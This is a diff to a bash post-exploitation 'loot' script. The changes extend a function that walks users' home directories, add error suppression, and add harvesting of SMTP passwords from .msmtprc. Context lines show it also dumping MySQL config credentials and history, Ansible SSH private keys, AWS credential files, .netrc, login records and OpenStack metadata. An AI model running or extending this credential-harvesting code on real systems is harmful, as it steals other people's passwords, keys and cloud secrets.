@@ -785,14 +785,22 @@ _loot_wp() {
     echo -en "${CN}"
 }
 
-# _loot_home <NAME> <filename>
+# _loot_home <NAME> <filename> <cmd> <...>
 _loot_homes() {
-    local fn hn
+    local fn hn str
+    local name="${1:-CREDS}"
+    local fname="${2:?}"
+    shift 1
+    shift 1
+	[ $# -le 0 ] && set -- cat
+
     for hn in "${HOMEDIRARR[@]}"; do
-        fn="${hn}/${2:?}"
+        fn="${hn}/${fname}"
         [ ! -s "$fn" ] && continue
-        echo -e "${CB}${1:-CREDS} ${CDY}${fn}${CF}"
-        cat "$fn"
+        str="$("$@" "$fn" 2>/dev/null)"
+        [ -z "$str" ] && continue
+        echo -e "${CB}${name} ${CDY}${fn}${CF}"
+        echo "$str"
         echo -en "${CN}"
     done
 }
@@ -1158,12 +1166,12 @@ lootmore() {
 
     command -v lastlog >/dev/null && {
         echo -e "${CB}Logins ${CDY}${CF}"
-        lastlog | grep -vF 'Never logged'
+        lastlog 2>/dev/null | grep -vF 'Never logged'
         echo -en "${CN}"
     }
     command -v last >/dev/null && {
         echo -e "${CB}Last Logins ${CDY}${CF}"
-        last -i -n20
+        last -i -n20 2>/dev/null
         echo -en "${CN}"
     }
 
@@ -1238,10 +1246,11 @@ loot() {
     for hn in "${HOMEDIRARR[@]}"; do
         fn="${hn}/.my.cnf"
         [ ! -s "$fn" ] && continue
+        str="$(grep -vE "^(#|\[)" "$fn" 2>/dev/null)"
+        [ -z "$str" ] && continue
         echo -e "${CB}MySQL ${CDY}${fn}${CF}"
-        grep -vE "^(#|\[)" <"${fn}"
+        echo "$str"
         echo -en "${CN}"
-        # grep -E "^(user|password)" "${h}/.my"
     done
     for hn in "${HOMEDIRARR[@]}"; do
         fn="${hn}/.mysql_history"
@@ -1267,7 +1276,7 @@ loot() {
 
     ### SSH Keys
     [ -e "/etc/ansible/ansible.cfg" ] && {
-        str="$(grep ^private_key_file "/etc/ansible/ansible.cfg")"
+        str="$(grep ^private_key_file "/etc/ansible/ansible.cfg" 2>/dev/null)"
         s="${str##*= }"
         loot_sshkey "$s"
     }
@@ -1288,6 +1297,7 @@ loot() {
     _loot_homes "AWS S3" ".boto"
     _loot_homes "AWS S3" ".aws/credentials"
     _loot_homes "NETRC"  ".netrc"
+    _loot_homes "SMTP"   ".msmtprc"         grep --color=never -E '(^user|^password)'
 
     # SSRF
     _loot_openstack
